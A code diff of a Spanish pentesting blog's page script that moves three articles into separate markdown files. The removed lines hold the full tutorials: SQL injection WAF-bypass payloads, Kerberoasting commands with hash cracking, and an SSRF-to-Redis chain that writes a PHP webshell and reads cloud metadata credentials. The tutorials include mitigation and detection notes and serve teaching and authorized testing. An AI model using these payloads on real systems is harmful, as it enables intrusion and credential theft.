@@ -1523,366 +1523,40 @@
     </div>
 
     <script>
-        // ===== BLOG ARTICLES DATABASE =====
+
+// ===== BLOG ARTICLES DATABASE =====
 const blogArticles = [
-            {
-                id: 'sql-injection-waf-bypass',
-                title: 'SQL Injection Avanzado: Bypassing WAF Modernos',
-                date: '2024-12-15',
-                author: 'xD4nt3',
-                readTime: '15 min',
-                excerpt: 'Técnicas avanzadas para evadir Web Application Firewalls utilizando codificación y payloads polimórficos en entornos reales.',
-                tags: ['SQLi', 'WAF Bypass', 'Web Security'],
-                content: `
-# SQL Injection Avanzado: Bypassing WAF Modernos
-
-En el pentesting web moderno, uno de los mayores desafíos es evadir los **Web Application Firewalls (WAF)** que protegen aplicaciones vulnerables. En este artículo, exploraremos técnicas avanzadas de bypass.
-
-## ¿Qué es un WAF?
-
-Un WAF es una barrera de seguridad que analiza el tráfico HTTP/HTTPS en busca de patrones maliciosos. Los WAFs modernos utilizan:
-
-- Expresiones regulares
-- Machine Learning
-- Análisis heurístico
-- Listas negras de payloads conocidos
-
-## Técnicas de Bypass
-
-### 1. Codificación y Ofuscación
-
-Una de las técnicas más efectivas es la codificación múltiple:
-
-\`\`\`sql
--- Payload normal (bloqueado)
-' OR 1=1--
-
--- URL Encoding
-%27%20OR%201%3D1--
-
--- Double URL Encoding
-%2527%2520OR%25201%253D1--
-
--- Unicode Encoding
-\\u0027 OR 1=1--
-\`\`\`
-
-### 2. Case Manipulation
-
-Muchos WAFs son case-sensitive en sus reglas:
-
-\`\`\`sql
-' oR 1=1--
-' Or 1=1--
-' OR 1=1--
-\`\`\`
-
-### 3. Comentarios Inline
-
-Insertar comentarios dentro del payload:
-
-\`\`\`sql
-' OR/**/1=1--
-' OR/*comment*/1/*another*/=/**/1--
-\`\`\`
-
-## Ejemplo Práctico
-
-Supongamos que tenemos este endpoint vulnerable:
-
-\`\`\`
-https://vulnerable-site.com/search?id=1
-\`\`\`
-
-**Paso 1**: Detectar el WAF
-
-\`\`\`bash
-curl -X GET "https://vulnerable-site.com/search?id=1' OR 1=1--"
-# Response: 403 Forbidden (WAF detectado)
-\`\`\`
-
-**Paso 2**: Aplicar bypass con codificación
-
-\`\`\`bash
-curl -X GET "https://vulnerable-site.com/search?id=1'/**/OR/**/1=1--"
-# Response: 200 OK (Bypass exitoso)
-\`\`\`
-
-## Herramientas Útiles
-
-- **SQLMap**: Incluye tamper scripts para bypass
-- **Burp Suite**: Intruder con payloads personalizados
-- **WAFNinja**: Herramienta especializada en bypass
-
-## Conclusión
-
-El bypass de WAF es un arte que requiere:
-
-1. Entender cómo funciona el WAF objetivo
-2. Probar múltiples técnicas de codificación
-3. Ser creativo con la ofuscación
-4. Documentar qué funciona y qué no
-
-> **Nota Importante**: Estas técnicas son para uso educativo y pruebas autorizadas únicamente.
-
-## Referencias
-
-- OWASP WAF Evasion Guide
-- PortSwigger SQL Injection Cheat Sheet
-- PentesterLab Advanced SQL Injection
-                `
-            },
-            {
-                id: 'active-directory-kerberoasting',
-                title: 'Active Directory: Kerberoasting al Detalle',
-                date: '2024-12-08',
-                author: 'xD4nt3',
-                readTime: '20 min',
-                excerpt: 'Guía completa sobre cómo explotar cuentas de servicio en Active Directory mediante técnicas de Kerberoasting.',
-                tags: ['Active Directory', 'Kerberoasting', 'Windows'],
-                content: `
-# Active Directory: Kerberoasting al Detalle
-
-**Kerberoasting** es una técnica post-explotación que permite extraer hashes de contraseñas de cuentas de servicio en Active Directory.
-
-## ¿Qué es Kerberoasting?
-
-Kerberoasting explota la forma en que Kerberos maneja las cuentas de servicio (SPNs). Cualquier usuario autenticado puede solicitar un ticket TGS para cualquier servicio, y este ticket está cifrado con la contraseña del servicio.
-
-### Flujo del Ataque
-
-1. Usuario autenticado solicita TGS
-2. DC responde con ticket cifrado con hash NTLM de la cuenta de servicio
-3. Atacante extrae el ticket
-4. Crackeo offline del hash
-
-## Prerequisitos
-
-- Credenciales válidas de dominio (cualquier usuario)
-- Acceso a la red del dominio
-- Herramientas: Rubeus, Impacket, PowerView
-
-## Ejecución del Ataque
-
-### Enumeración de SPNs
-
-Con PowerView:
-
-\`\`\`powershell
-# Listar todos los SPNs
-Get-DomainUser -SPN
-
-# Filtrar cuentas interesantes
-Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
-\`\`\`
-
-Con Impacket:
-
-\`\`\`bash
-GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
-\`\`\`
-
-### Solicitar Tickets TGS
-
-Con Rubeus:
-
-\`\`\`powershell
-Rubeus.exe kerberoast /outfile:hashes.txt
-\`\`\`
-
-Con Impacket:
-
-\`\`\`bash
-GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request
-\`\`\`
-
-### Crackeo de Hashes
-
-Usando Hashcat:
-
-\`\`\`bash
-hashcat -m 13100 hashes.txt wordlist.txt --force
-\`\`\`
-
-Usando John:
-
-\`\`\`bash
-john --format=krb5tgs --wordlist=wordlist.txt hashes.txt
-\`\`\`
-
-## Ejemplo Práctico
-
-\`\`\`bash
-# 1. Enumerar SPNs
-GetUserSPNs.py CORPORATE.LOCAL/john:Password123 -dc-ip 192.168.1.10
-
-# 2. Solicitar tickets
-GetUserSPNs.py CORPORATE.LOCAL/john:Password123 -dc-ip 192.168.1.10 -request -outputfile spn.txt
-
-# 3. Crackear
-hashcat -m 13100 spn.txt rockyou.txt
-\`\`\`
-
-## Mitigación
-
-Para los Blue Teams:
-
-1. **Contraseñas fuertes** para cuentas de servicio (25+ caracteres)
-2. **Managed Service Accounts** (MSA/gMSA)
-3. **Monitoreo** de solicitudes TGS anormales
-4. **Auditoría** regular de SPNs
-
-## Detección
-
-Buscar en logs de eventos:
-
-- Event ID 4769 (Kerberos Service Ticket Request)
-- RC4 encryption en lugar de AES
-- Múltiples solicitudes TGS de un mismo usuario
-
-## Conclusión
-
-Kerberoasting es efectivo porque:
-- No requiere privilegios elevados
-- Difícil de detectar
-- Crackeo offline (sin lockout)
-
-Es esencial implementar contraseñas robustas en cuentas de servicio.
-                `
-            },
-            {
-                id: 'ssrf-to-rce',
-                title: 'SSRF a RCE: Chain de Vulnerabilidades',
-                date: '2024-11-29',
-                author: 'xD4nt3',
-                readTime: '18 min',
-                excerpt: 'Caso práctico de cómo encadenar una vulnerabilidad SSRF con otras fallas para lograr ejecución remota de código.',
-                tags: ['SSRF', 'RCE', 'Vulnerability Chaining'],
-                content: `
-# SSRF a RCE: Chain de Vulnerabilidades
-
-El **Server-Side Request Forgery (SSRF)** puede parecer una vulnerabilidad de impacto medio, pero cuando se encadena correctamente puede llevar a **Remote Code Execution (RCE)**.
-
-## ¿Qué es SSRF?
-
-SSRF permite que un atacante haga que el servidor realice peticiones HTTP a recursos arbitrarios:
-
-- Servicios internos (localhost, 127.0.0.1)
-- Cloud metadata (169.254.169.254)
-- Recursos de red interna
-
-## Vectores de Escalación
-
-### 1. SSRF → Cloud Metadata → AWS Credentials
-
-\`\`\`bash
-# Explotar SSRF para acceder a metadata de AWS
-http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Obtener credenciales temporales
-http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
-\`\`\`
-
-### 2. SSRF → Redis → RCE
-
-Si hay un Redis sin autenticación en localhost:
-
-\`\`\`bash
-# 1. Escribir webshell vía SSRF
-url=dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
-url=dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
-url=dict://127.0.0.1:6379/SET:test:"<?php system($_GET['cmd']); ?>"
-url=dict://127.0.0.1:6379/SAVE
-
-# 2. Acceder al shell
-http://vulnerable-app.com/shell.php?cmd=whoami
-\`\`\`
-
-### 3. SSRF → Internal API → Privilege Escalation
-
-\`\`\`bash
-# Acceder a API interna no expuesta
-POST /fetch HTTP/1.1
-Host: vulnerable-app.com
-
-url=http://internal-admin-api:8080/api/users/1/promote
-
-{
-  "role": "admin"
-}
-\`\`\`
-
-## Caso Práctico: Encadenamiento Completo
-
-### Escenario
-
-- Aplicación web con funcionalidad de "fetch URL"
-- Redis en localhost:6379 sin autenticación
-- Directorio web escribible
-
-### Paso 1: Detectar SSRF
-
-\`\`\`bash
-# Test básico
-curl "http://target.com/fetch?url=http://127.0.0.1:6379"
-\`\`\`
-
-### Paso 2: Explotar Redis
-
-\`\`\`python
-import requests
-
-base_url = "http://target.com/fetch?url="
-
-# Configurar directorio
-requests.get(base_url + "dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html")
-
-# Configurar nombre de archivo
-requests.get(base_url + "dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php")
-
-# Escribir webshell
-payload = '<?php system($_GET["cmd"]); ?>'
-requests.get(base_url + f"dict://127.0.0.1:6379/SET:shell:{payload}")
-
-# Guardar
-requests.get(base_url + "dict://127.0.0.1:6379/SAVE")
-\`\`\`
-
-### Paso 3: Confirmar RCE
-
-\`\`\`bash
-curl "http://target.com/shell.php?cmd=id"
-# Response: uid=33(www-data) gid=33(www-data)
-\`\`\`
-
-## Protocolos Útiles para SSRF
-
-| Protocolo | Puerto | Uso |
-|-----------|--------|-----|
-| dict:// | 6379 | Redis |
-| gopher:// | Varios | Multi-protocolo |
-| file:// | N/A | Lectura de archivos |
-| http:// | 80/8080 | APIs internas |
-
-## Mitigación
-
-1. **Whitelist** de dominios permitidos
-2. **Deshabilitar** redirects HTTP
-3. **Validación** de esquemas (solo http/https)
-4. **Segmentación** de red interna
-5. **Autenticación** en servicios internos
-
-## Conclusión
-
-SSRF es peligroso porque:
-- Da acceso a recursos internos
-- Puede encadenarse con otras vulnerabilidades
-- Bypass de firewalls y segmentación
-
-Siempre busca cómo escalar el impacto.
-                `
-            }
-        ];
+    {
+        id: 'sql-injection-waf-bypass',
+        title: 'SQL Injection Avanzado: Bypassing WAF Modernos',
+        date: '2024-12-15',
+        author: 'xD4nt3',
+        readTime: '15 min',
+        excerpt: 'Técnicas avanzadas para evadir Web Application Firewalls utilizando codificación y payloads polimórficos en entornos reales.',
+        tags: ['SQLi', 'WAF Bypass', 'Web Security'],
+        file: 'blog/sql-injection-waf-bypass.md'  // ← Ruta al archivo
+    },
+    {
+        id: 'active-directory-kerberoasting',
+        title: 'Active Directory: Kerberoasting al Detalle',
+        date: '2024-12-08',
+        author: 'xD4nt3',
+        readTime: '20 min',
+        excerpt: 'Guía completa sobre cómo explotar cuentas de servicio en Active Directory mediante técnicas de Kerberoasting.',
+        tags: ['Active Directory', 'Kerberoasting', 'Windows'],
+        file: 'blog/active-directory-kerberoasting.md'
+    },
+    {
+        id: 'ssrf-to-rce',
+        title: 'SSRF a RCE: Chain de Vulnerabilidades',
+        date: '2024-11-29',
+        author: 'xD4nt3',
+        readTime: '18 min',
+        excerpt: 'Caso práctico de cómo encadenar una vulnerabilidad SSRF con otras fallas para lograr ejecución remota de código.',
+        tags: ['SSRF', 'RCE', 'Vulnerability Chaining'],
+        file: 'blog/ssrf-to-rce.md'
+    }
+];
 
 
 // ===== BLOG FUNCTIONS =====
@@ -1912,33 +1586,65 @@ function loadBlogList() {
     });
 }
 
-function loadBlogArticle(articleId) {
+async function loadBlogArticle(articleId) {
     const article = blogArticles.find(a => a.id === articleId);
     if (!article) return;
 
     const container = document.getElementById('blog-article-container');
     
-    // Convertir markdown a HTML
-    const htmlContent = marked.parse(article.content);
-
+    // Mostrar loading
     container.innerHTML = `
-        <div class="blog-article-header">
-            <h1 class="blog-article-title">${article.title}</h1>
-            <div class="blog-article-meta">
-                <span>📅 ${article.date}</span>
-                <span>✍️ ${article.author}</span>
-                <span>⏱️ ${article.readTime} de lectura</span>
-            </div>
-            <div>
-                ${article.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
-            </div>
-        </div>
-        <div class="blog-article-content">
-            ${htmlContent}
+        <div style="text-align: center; padding: 60px; color: var(--gray);">
+            <div style="font-size: 3em; margin-bottom: 20px;">⏳</div>
+            <p>Cargando artículo...</p>
         </div>
     `;
 
-    showPage('blog-article');
+    try {
+        // Cargar el archivo markdown
+        const response = await fetch(article.file);
+        
+        if (!response.ok) {
+            throw new Error('Artículo no encontrado');
+        }
+        
+        const markdownContent = await response.text();
+        
+        // Convertir markdown a HTML
+        const htmlContent = marked.parse(markdownContent);
+
+        container.innerHTML = `
+            <div class="blog-article-header">
+                <h1 class="blog-article-title">${article.title}</h1>
+                <div class="blog-article-meta">
+                    <span>📅 ${article.date}</span>
+                    <span>✍️ ${article.author}</span>
+                    <span>⏱️ ${article.readTime} de lectura</span>
+                </div>
+                <div>
+                    ${article.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
+                </div>
+            </div>
+            <div class="blog-article-content">
+                ${htmlContent}
+            </div>
+        `;
+
+        showPage('blog-article');
+        
+    } catch (error) {
+        container.innerHTML = `
+            <div style="text-align: center; padding: 60px; color: var(--red);">
+                <div style="font-size: 3em; margin-bottom: 20px;">❌</div>
+                <h2 style="color: var(--red-light); margin-bottom: 10px;">Error al cargar el artículo</h2>
+                <p style="color: var(--gray);">${error.message}</p>
+                <button class="cta-button" onclick="showPage('blog')" style="margin-top: 20px;">
+                    ← Volver al blog
+                </button>
+            </div>
+        `;
+        showPage('blog-article');
+    }
 }
 
 // ===== SCROLL TO TOP BUTTON =====
